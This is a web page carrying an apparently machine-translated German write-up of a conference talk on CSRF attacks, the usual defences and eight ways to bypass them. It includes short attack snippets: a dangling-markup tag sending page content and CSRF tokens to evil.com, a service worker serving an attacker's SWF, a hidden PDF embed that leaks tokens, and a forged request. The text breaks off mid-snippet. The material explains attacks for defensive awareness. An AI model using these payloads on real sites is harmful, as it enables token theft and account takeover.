<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üí• üöí üéÖüèæ CSRF-Schwachstellen sind weiterhin relevant üë®üèª‚Äç‚öïÔ∏è üö∫ üö∂üèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="CSRF (Cross Site Request Forgery) ins Russische √ºbersetzt ist eine F√§lschung von Cross-Site-Anfragen. Mikhail Egorov ( 0ang3el ) sprach in seinem Beri...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>CSRF-Schwachstellen sind weiterhin relevant</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/">  CSRF (Cross Site Request Forgery) ins Russische √ºbersetzt ist eine F√§lschung von Cross-Site-Anfragen.  <strong>Mikhail Egorov</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">0ang3el</a> ) sprach in seinem Bericht √ºber <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Highload ++</a> 2017 √ºber CSRF-Schwachstellen, dar√ºber, welche Schutzmechanismen normalerweise verwendet werden und wie sie ohnehin umgangen werden k√∂nnen.  Am Ende brachte er eine Reihe von Tipps zur richtigen Verteidigung gegen CSRF-Angriffe vor.  Unter Katze Dekodierung dieser Leistung. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>√úber den Sprecher:</strong> Mikhail Egorov arbeitet bei Ingram Micro Cloud und besch√§ftigt sich mit Anwendungssicherheit.  In seiner Freizeit besch√§ftigt sich Mikhail mit der Suche nach Schwachstellen und der Fehlersuche und spricht auf Sicherheitskonferenzen. <br><br>  <strong>Haftungsausschluss:</strong> Die angegebenen Informationen sind ausschlie√ülich die Meinung des Autors, alle √úbereinstimmungen sind zuf√§llig. <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br>  Dieses Cookie-Monster ist schuld daran, dass CSRF-Angriffe funktionieren.  Tatsache ist, dass viele Webanwendungen Cookies verwenden (im Folgenden halten wir es f√ºr angemessen, Cookies auf Russisch aufzurufen), um die Sitzung des Benutzers zu steuern.  Der Browser ist so konzipiert, dass Benutzer-Cookies f√ºr diese Domain und diesen Pfad automatisch zusammen mit der HTTP-Anforderung gesendet werden. <br><a name="habracut"></a><br><h3>  Cookies <br></h3><br>  Ein Cookie ist ein kleines Datenelement, das ein Webserver in Form von name = value in einem HTTP-Header namens "Set-Cookie" an einen Client sendet.  Der Browser speichert diese Daten auf dem Computer des Benutzers und sendet diese Daten bei Bedarf als Teil einer HTTP-Anforderung in einem HTTP-Header namens "Cookie" an den Webserver. <br><br>  Cookies k√∂nnen verschiedene Attribute haben, z. B.: Verf√§llt, Domain, sicher, http: nur: <br><br>  Cookies wurden erstmals 1994 im Netscape-Browser angezeigt.  Viele Webanwendungen verwenden sie immer noch zum Verwalten der Sitzung eines Benutzers. <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br>  Mal sehen, wie der klassische CSRF-Angriff (Cross Site Request Forgery) funktioniert. <br><br>  Angenommen, unsere Webanwendung kann die Lieferadresse des Benutzers √§ndern und verwendet Cookies, um die Sitzung zu steuern. <br><br>  Wir haben ein HTML-Formular, das der Benutzer ausf√ºllen muss: Geben Sie die Adresse ein und klicken Sie auf die Schaltfl√§che "Speichern".  Infolgedessen wird eine POST-Anforderung mit einem HTML-Formular an das Backend gesendet.  Wir sehen, dass der Browser dort automatisch Sitzungscookies des Benutzers setzt.  Wenn das Backend eine solche Anfrage erh√§lt, erkennt es, dass es eine solche Sitzung gibt, ist es ein legitimer Benutzer und √§ndert seine Lieferadresse. <br><br>  Was kann ein Angreifer tun? <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br>  Er kann eine HTML-Seite auf seiner Website attacker.com platzieren, die das HTML-Formular tats√§chlich als Beispiel sendet <em>.</em>  <em>com</em> .  Da der Browser die Cookies des Benutzers automatisch in die HTTP-Anfrage einf√ºgt, versteht das Backend einfach nicht, ob die Anfrage legitim ist - ist es das Ergebnis des Ausf√ºllens des Formulars durch den Benutzer oder handelt es sich um einen CSRF-Angriff - und √§ndert die Zustelladresse f√ºr den Benutzer in einen Wert, der f√ºr den Angreifer von Vorteil ist . <br><br>  Es gibt eine weitere Option f√ºr einen CSRF-Angriff mithilfe der XHR-API.  Wenn viele von dem CSRF-Angriff mit HTML-Formularen geh√∂rt haben, wissen sie weniger √ºber diese Methode, aber sie funktioniert auch. <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br>  Beachten Sie das Attribut withCredentials, das bewirkt, dass der Browser automatisch Benutzer-Cookies sendet.  Da der Wert von Content-type application / x-www-form-urlencoded ist, sendet der Browser diese Anforderung ohne Preflight-Anforderung f√ºr CORS-Optionen, und der CSRF-Angriff funktioniert erneut. <br><br>  Lassen Sie uns genauer betrachten, wie dies geschieht. <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br>  Ausgangsdaten: <br><br><ul><li>  <i>example.com-</i> Anwendung, die f√ºr CSRF anf√§llig ist, <br></li><li>  Benutzer <br></li><li>  Angreifer-Site, auf der sich eine csrf-xhr.html-Seite befindet. <br></li></ul><br>  Der Benutzer wird in der Anwendung authentifiziert, die sich auf <i>example.com befindet</i> .  Wenn er zur Site des Angreifers geht, wird automatisch eine POST-Anfrage ausgef√ºhrt, die die Lieferadresse √§ndert.  Der Browser f√ºgt automatisch Sitzungscookies in die Anfrage ein und das Backend √§ndert die Adresse. <br><br><h2>  CSRF-Angriffsverlauf <br></h2><br>  Im Allgemeinen sind CSRF-Angriffe seit 2001 bekannt, als sie aktiv ausgenutzt wurden.  Im Zeitraum 2008-2012 waren solche Sicherheitsl√ºcken an jedem ersten Standort vorhanden, einschlie√ülich: <br><br><ol><li>  YouTube <br></li><li>  Die New York Times; <br></li><li>  Badoo <br></li><li>  Slideshare <br></li><li>  Vimeo; <br></li><li>  Hulu; <br></li><li>  Kinosuche; <br></li><li>  ... <br></li></ol><br><h2>  Wie schwerwiegend sind CSRF-Schwachstellen? <br></h2><br>  Tats√§chlich h√§ngt alles von der Kritikalit√§t der anf√§lligen Aktion ab.  Das kann sein: <br><br><ul><li>  Konto√ºbernahme - Der Angreifer erfasst das Konto des Opfers, indem er die E-Mail √ºber CSRF √§ndert. <br></li><li>  Eskalation von Berechtigungen - Erh√∂hung der Berechtigungen aufgrund der Tatsache, dass der Angreifer √ºber CSRF einen neuen Benutzer mit hohen Rechten im System erstellt. <br></li><li>  Remote-Codeausf√ºhrung - Codeausf√ºhrung aufgrund der Befehlsinjektion im Admin-Panel √ºber CSRF. <br></li></ul><br>  Schauen wir uns an, was international etablierte Schwachstellenklassifikationen √ºber den Schweregrad von CSRF aussagen. <br><br>  Im <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">OWASP Top 10-</a> Projekt, das die 10 kritischsten Schwachstellen in der Anwendung enth√§lt, <strong>belegten</strong> CSRF-Schwachstellen 2010 den <strong>f√ºnften Platz</strong> .  Dann begannen die Entwickler, verschiedene Schutzoptionen zu implementieren, und bereits 2013 r√ºckten CSRF-Schwachstellen auf Platz 8 vor. <br><br>  CSRF-Schwachstellen wurden f√ºr 2017 √ºberhaupt nicht in die Liste aufgenommen, da sie laut Statistik angeblich <strong>nur noch in 8% der F√§lle</strong> in Penetrationstests gefunden <strong>werden</strong> . <br><br>  Pers√∂nlich stimme ich diesen Statistiken nicht zu, da ich in den letzten zwei Jahren buchst√§blich viele CSRF-Schwachstellen gefunden habe.  Als n√§chstes werde ich Ihnen sagen, wie ich es gemacht habe. <br><br>  In der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bugcrowd VRT-</a> Klassifizierung (Vulnerability Rating Taxonomy) haben anwendungsweite CSRF-Schwachstellen einen Schweregrad von P2 (hoch).  Oben ist nur der Schweregrad kritisch, das hei√üt, dies sind <strong>ziemlich schwerwiegende Sicherheitsl√ºcken</strong> . <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br>  √úberlegen Sie, welche CSRF-Schutzoptionen vorhanden sind und wie die einzelnen Schutzoptionen funktionieren. <br><br>  <strong>1. CSRF-Token</strong> <br><ul><li>  F√ºr jede Benutzersitzung wird ein eindeutiges und hochentropisches Token generiert. <br></li><li>  Das Token wird in das DOM der HTML-Seite eingef√ºgt oder dem Benutzer √ºber die API √ºbergeben. <br></li><li>  Der Benutzer muss mit jeder Anforderung, die mit √Ñnderungen verbunden ist, ein Token im Parameter oder im HTTP-Header der Anforderung senden. <br></li><li>  Da der Angreifer das Token nicht kennt, funktioniert der klassische CSRF-Angriff nicht. <br></li></ul><br>  <strong>2. Cookie doppelt senden</strong> <br><ul><li>  Wiederum wird f√ºr jede Benutzersitzung ein eindeutiges und hochentropisches Token generiert, das jedoch in Cookies abgelegt wird. <br></li><li>  Der Benutzer muss die gleichen Werte in der Anforderung in der Anforderung und im Anforderungsparameter √ºbergeben. <br></li><li>  Wenn diese beiden Werte in Cookies und im Parameter √ºbereinstimmen, wird davon ausgegangen, dass dies eine legitime Anforderung ist. <br></li><li>  Da der Angreifer Cookies im Browser des Benutzers einfach nicht √§ndern kann, funktioniert der klassische CSRF-Angriff nicht. <br></li></ul><br>  <strong>3. Inhaltstypbasierter Schutz</strong> <br><ul><li>  Der Benutzer muss eine Anfrage mit einem bestimmten Content-Type-Header senden, z. B. application / json. <br></li><li>  Da es unm√∂glich ist, √ºber das HTML-Formular oder die XHR-API einen beliebigen Cross-Origin-Inhaltstyp im Browser zu senden, funktioniert der klassische CSRF-Angriff nicht mehr. <br></li></ul><br>  <strong>4. Referer-basierter Schutz</strong> <br><ul><li>  Der Benutzer muss eine Anfrage mit einem bestimmten Referer-Header-Wert senden.  Das Backend √ºberpr√ºft es. Wenn es falsch ist, wird davon ausgegangen, dass es sich um einen CSRF-Angriff handelt. <br></li><li>  Da der Browser keinen beliebigen Verweis √ºber ein HTML-Formular oder eine XHR-API senden kann, funktioniert der klassische CSRF-Angriff nicht. <br></li></ul><br>  <strong>5. Passwortbest√§tigung / Websudo</strong> <br><ul><li>  Der Benutzer muss die Aktion mit einem Passwort (oder einem Geheimnis) best√§tigen. <br></li><li>  Da der Angreifer ihn nicht kennt, funktioniert der klassische CSRF-Angriff nicht. <br></li></ul><br>  <strong>6. SameSite-Cookies in Chrome, Opera</strong> <br>  Dies ist eine neue Technologie, die zum Schutz vor CSRF entwickelt wurde.  Im Moment funktioniert es nur in zwei Browsern (Chrome, Opera). <br><br><ul><li>  Ein Cookie wird mit einem zus√§tzlichen Attribut gesetzt - samesite, das zwei Werte haben kann: lax oder strict. <br></li><li>  Das Wesentliche der Technologie ist, dass der Browser keine Cookies sendet, wenn die Anfrage von einer anderen Domain stammt, beispielsweise von der Website des Angreifers.  Dies sch√ºtzt also wieder vor dem klassischen CSRF-Angriff. <br></li></ul><br>  Leider gibt es √ºberall Funktionen von Browsern, Webanwendungen und deren Bereitstellung, mit denen Sie manchmal <strong>den CSRF-Schutz umgehen k√∂nnen</strong> . <br><br>  Lassen Sie uns nun √ºber <strong>8 M√∂glichkeiten</strong> sprechen <strong>, um den Schutz zu umgehen</strong> , die in der Praxis verwendet werden k√∂nnen. <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>Problemumgehungsszenarien:</strong> <br></h3><br>  <strong>1. XSS (Cross-Sitescripting)</strong> <br><br>  Wenn Ihre Webanwendung √ºber XSS verf√ºgt, ist sie automatisch f√ºr CSRF anf√§llig, und es ist schwierig, sich davor zu sch√ºtzen.  <strong>Sie k√∂nnen nur ertragen</strong> . <br><br>  <strong>2. Dangling Markup</strong> <br><br>  Angenommen, unsere Anwendung ist anf√§llig f√ºr HTML-Injection, es gibt jedoch kein XSS.  Beispielsweise gibt es eine Content Security Policy (CSP), die vor XSS sch√ºtzt.  Ein Angreifer kann jedoch weiterhin HTML-Tags einbetten. <br><br>  Wenn unsere Anwendung einen Schutz basierend auf CSRF-Token implementiert, kann der Angreifer solchen HTML-Code einbetten. Dies sind keine geschlossenen Bild- oder Formular-Tags: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Infolgedessen wird ein Teil der DOM-HTML-Seite an die Ressource des Angreifers gesendet.  Es ist sehr wahrscheinlich, dass, wenn der Angreifer solchen HTML-Code korrekt implementiert, das, was auf die Website des Angreifers gelangt, ein CSRF-Token enth√§lt. <br><br>  Nachdem der Angreifer das Token gelernt hat, kann er CSRF auf klassische Weise ausnutzen. <br><br>  <strong>3. Anf√§llige Subdomain</strong> <br><br>  Angenommen, wir haben eine Subdomain <em>foo.example.com</em> , die anf√§llig f√ºr die <strong>√úbernahme</strong> von <strong>Subdomains</strong> oder <strong>XSS ist.</strong>  Durch die √úbernahme der Subdomain kontrolliert der Angreifer die Subdomain vollst√§ndig und kann dort beliebige HTML-Seiten hinzuf√ºgen oder JS-Code im Kontext der Subdomain ausf√ºhren.  Wenn unsere Subdomain f√ºr solche Dinge anf√§llig ist, kann der Angreifer die folgenden Arten von CSRF-Schutz umgehen: <br><br><ul><li>  CSRF-Token; <br></li><li>  Cookie doppelt einreichen; <br></li><li>  Inhaltstypbasierter Schutz. <br></li></ul><br>  Angenommen, unsere Hauptanwendung verwendet <strong>CORS</strong> (Cross-Origin Resource Sharing) f√ºr die dom√§nen√ºbergreifende Kommunikation.  In die Serverantwort werden zwei Header eingef√ºgt: <br><br><ol><li>  Access-Control-Allow-Origin: foo.example.com (foo.example.com - anf√§llige Subdomain); <br></li><li>  Access-Control-Allow-Credentials: true <strong>&nbsp;</strong>  - damit mit der XHR-API eine Anfrage mit Benutzer-Cookies gestellt werden kann. <br></li></ol><br>  Wenn diese Bedingungen erf√ºllt sind, kann der Angreifer einfach das CSRF-Token aus der von ihm kontrollierten Subdomain lesen und das CSRF auf klassische Weise weiter ausnutzen. <br><br>  Die n√§chste Option.  Angenommen, es gibt eine <strong>crossdomain.xml-</strong> Datei in der Hauptdom√§ne, die wir angreifen m√∂chten.  Diese Datei wird von Flash- und PDF-Plugins f√ºr die Interaktion mit Subdomains verwendet, und der Zugriff von allen Subdomains aus ist zul√§ssig. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Wenn der Angreifer die JS-Datei auf <i>foo.example.com</i> hochladen kann, kann er in diesem Fall die Service Worker-API f√ºr die Subdomain foo.example.com verwenden, die die Flash-Datei tats√§chlich ausgibt. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br>  Da wir crossdomain.xml in der Hauptdom√§ne haben, was die Interaktion von Subdom√§nen erm√∂glicht, liest der Angreifer einfach das CSRF-Token √ºber diese SWF. <br><br><blockquote>  √úbrigens wurde k√ºrzlich eine √§hnliche Sicherheitsl√ºcke in Amazon gefunden, weitere Details <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . <br></blockquote><br>  Selbst wenn CORS nicht konfiguriert ist und keine Datei crossdomain.xml vorhanden ist, aber der Double-Submit-Cookie-Schutz verwendet wird, kann ein Angreifer einfach Cookies aus der Subdomain f√ºr die √ºbergeordnete Dom√§ne in den Pfad einf√ºgen, in dem er CSRF ausnutzen m√∂chte, und so den Double-Submit-Cookie-Schutz umgehen. <br><br>  <strong>4. Schlechtes PDF</strong> <br><br>  Diese Problemumgehung basiert auf PDF.  Adobe verf√ºgt √ºber ein PDF-Plugin, das bei der Installation von Adobe Reader automatisch installiert wird.  Dieses Plugin unterst√ºtzt das sogenannte FormCalc-Skript.  Jetzt funktioniert das PDF-Plugin von Adobe jedoch nur in IE11 und Firefox ESR. <br><br>  FormCalc bietet zwei gro√üartige Methoden: get () und post ().  Ein Angreifer, der die get-Methode verwendet, kann das CSRF-Token per Post lesen und an seine Site senden.  Der Angreifer erh√§lt also den CSRF-Token des Opfers. <br><br>  Angenommen, wir k√∂nnen eine PDF-Datei in eine Webanwendung hochladen.  Tats√§chlich kann es sich sogar um eine Datei eines anderen Formats handeln. Beispielsweise kann ein Angreifer versuchen, eine PDF-Datei unter dem Deckmantel eines Bildes herunterzuladen, bei dem es sich um den Avatar des Benutzers handelt. <br><br>  Die Anwendung verf√ºgt √ºber eine API in der Hauptdom√§ne, mit der Sie den Inhalt der heruntergeladenen Datei abrufen k√∂nnen.  Anschlie√üend kann der Angreifer eine HTML-Seite verwenden, auf der die PDF-Datei eingebettet ist, die der Angreifer mithilfe des Einbettungs-Tags auf <i>example.com</i> hochgeladen hat. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <strong>Leak.pdf</strong> Datei: <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br>  Diese Datei enth√§lt ein FormCalc-Skript, das nur die Seite Settings.action liest, auf der sich ein CSRF-Token im DOM befindet, und es mithilfe der Post-Methode an die Site des Angreifers sendet. <br><br>  Da das PDF von example.com heruntergeladen wird, hat dieses PDF selbst vollen Zugriff auf alle Ursprungs- <code>https://example.com</code> : <code>https://example.com</code> und kann Daten von dort lesen, ohne den SOP-Modus (Same Origin Policy) zu verletzen. <br><br>  Ein weiterer Schwerpunkt ist, dass es f√ºr das PDF-Plugin keine Rolle spielt, mit welchem ‚Äã‚ÄãInhaltstyp die PDF-Datei angegeben wird, und sogar die HTTP-Antwort kann andere Header enthalten (z. B. Inhaltsdisposition).  Das PDF-Plugin rendert dieses PDF weiterhin und f√ºhrt das FormCalc-Skript aus. <br><br>  <strong>5. Cookie-Injektion</strong> <br><br>  Wenn der Double-Submit-Cookie-Schutz verwendet wird und der Angreifer Cookies irgendwie einf√ºhren kann, ist das Spiel vorbei. <br><br>  Eine der beliebtesten Optionen in diesem Szenario ist die <strong>CRLF-</strong> <strong>Injektion</strong> . <br><br>  Wenn der Angreifer zus√§tzliche Header in die Antwort des Servers einf√ºgen kann, kann er einfach den Set-Cookie-Header mit den erforderlichen Cookies hinzuf√ºgen und den CSRF-Schutz umgehen. <br><br>  Eine weitere Option bezieht sich auf <strong>Funktionen</strong> zur <strong>Behandlung</strong> von <strong>Browser-Cookies</strong> . <br><br>  In Safari k√∂nnen Sie beispielsweise durch Komma neue Cookies einf√ºgen (durch Kommas getrennte Cookies).  Angenommen, wir haben einen URL-Parameter in der Kopfzeile namens language.  Wir verarbeiten es und schreiben den ausgew√§hlten Sprachwert in Cookies an den Benutzer.  Wenn der Angreifer ein Komma einf√ºgt, kann er zus√§tzliche Cookies mit einem beliebigen Namen einf√ºgen. <br><br>  Das Umgehen des CSRF-Schutzes kann auch zu <strong>Browserfehlern f√ºhren</strong> .  In Firefox war es beispielsweise m√∂glich, Cookies √ºber ein SVG-Bild einzubetten ( <strong>CVE-2016-9078)</strong> .  Wenn wir einen HTML-Editor haben und dem Benutzer das Einf√ºgen von Bild-Tags erlauben, kann der Angreifer einfach auf das SVG-Bild im SRC-Attribut verweisen, wodurch die erforderlichen Cookies gesetzt werden. <br><br>  <strong>6. √Ñndern Sie den Inhaltstyp</strong> <br><blockquote>  Einige Entwickler glauben, dass Sie CSRF sparen k√∂nnen, wenn Sie ein nicht standardm√§√üiges Datenformat im Hauptteil einer POST-Anforderung f√ºr die Kommunikation mit dem Backend verwenden.  Dies ist eigentlich nicht der Fall. <br></blockquote><br>  Als Beispiel werde ich eine Sicherheitsanf√§lligkeit anf√ºhren, die ich k√ºrzlich in einem sehr beliebten Notizverwaltungsdienst gefunden habe. <br><br>  Es wurde eine API verwendet, die Apache Thrift (Bin√§rdatenformat) und Cookies verwendet, um die Sitzung zu steuern.  Um beispielsweise eine neue Notiz hinzuzuf√ºgen, musste der Benutzer eine solche POST-Anfrage senden.  Bin√§rdaten wurden im K√∂rper √ºbertragen und Inhaltstyp: Anwendung / x-Sparsamkeit wurde angegeben. <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br>  Tats√§chlich wurde dieser Inhaltstyp im Backend nicht validiert.  Es war m√∂glich, es in Text / Plain zu √§ndern und die XHR-API zu verwenden, um diese CSRF-Sicherheitsanf√§lligkeit auszunutzen, indem einfach Bin√§rdaten im Hauptteil der POST-Anforderung √ºbergeben wurden. <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br>  Tats√§chlich ist die auf Inhaltstypen basierende Sicherheit eine sehr schlechte Sicherheitsoption.  Es wird in den meisten F√§llen umgangen. <br><br>  <strong>7. Nicht einfacher Inhaltstyp</strong> <br><br>  √úber das HTML-Formular oder die XHR-API k√∂nnen wir die folgenden Inhaltstypen einreichen: <br><br><ul><li>  Text / Klartext; <br></li><li>  application / x-www-form-urlencoded; <br></li><li>  mehrteilige / Formulardaten. <br></li></ul><br>  Tats√§chlich ist es m√∂glich, beliebige Content-Type-Werte zu senden √ºber: <br><br><ul><li>  Fehler in Browsern (z. B. Navigator.sendBeacon); <br></li><li>  Plugins: Flash Plugin + 307 Redirect und PDF Plugin + 307 Redirect; <br></li><li>  Backend-Frameworks. <br></li></ul><br>  Einige Frameworks, wie das JAX-RS Apache CXF-Framework, unterst√ºtzen einen Parameter <strong>namens ctype</strong> in der URL.  Sie k√∂nnen in diesem Parameter einen beliebigen Inhaltstyp angeben. Das Backend √ºberpr√ºft diesen Parameter und verwendet ihn anstelle des Inhaltstyps, der an den Header √ºbergeben wird ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link</a> zur Quelle). <br><br>  Ein ziemlich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">bekannter Fehler</a> im Chrome-Browser wurde 2015 gefunden, nach dem er nach etwa einem Monat √∂ffentlich zug√§nglich wurde, aber erst 2017 behoben wurde.  Mit diesem Fehler konnten Sie eine POST-Anforderung mit einem beliebigen Inhaltstyp mithilfe einer API namens <strong>Navigator.sendBeacon ()</strong> an einen anderen Ursprung senden <strong>.</strong> <br>  Wie sah die Operation aus? <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span 